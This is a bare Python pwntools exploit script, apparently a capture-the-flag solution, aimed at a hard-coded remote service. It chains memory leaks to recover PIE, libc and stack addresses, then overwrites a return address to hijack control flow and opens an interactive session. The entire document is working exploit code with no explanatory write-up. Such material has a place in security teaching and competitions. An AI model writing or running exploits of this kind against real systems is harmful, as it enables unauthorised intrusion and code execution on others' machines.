from pwn import *
import sys
HOST = "125.235.240.167"
PORT = 4001
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
s.send(p8(0x58))
time.sleep(0.3)
s.send(p8(0x41))
pie = u64(s.recvuntil('T')[-10:-2]) - 0xa41
if( (pie>>40)&0xff != 0x55 and (pie>>40)&0xff != 0x56):
  sys.exit(-1)
print "PIE : ", hex(pie)

s.recvuntil('?')
time.sleep(0.3)
s.send('y')
time.sleep(0.3)
s.send(p64(pie+0x200F98))
time.sleep(0.3)
s.send('y')
libc = u64(s.recvuntil('T')[-10:-2]) - 0x809c0
print "LIBC : ", hex(libc)
s.recvuntil('?')
time.sleep(0.3)
s.send(p64(libc+0x3ee097))
time.sleep(0.3)
s.send('\xff')
stack = u64(s.recvuntil('T')[-9:-2]+"\x00") # environ
print "STACK : ", hex(stack)
raw_input('d')
s.recvuntil('?')
time.sleep(0.3)
s.send('y')
time.sleep(0.3)
s.send(p64(stack-0x130)) # return address in read@libc
time.sleep(0.3)
s.send(p64(pie+0x090E ))
s.interactive()
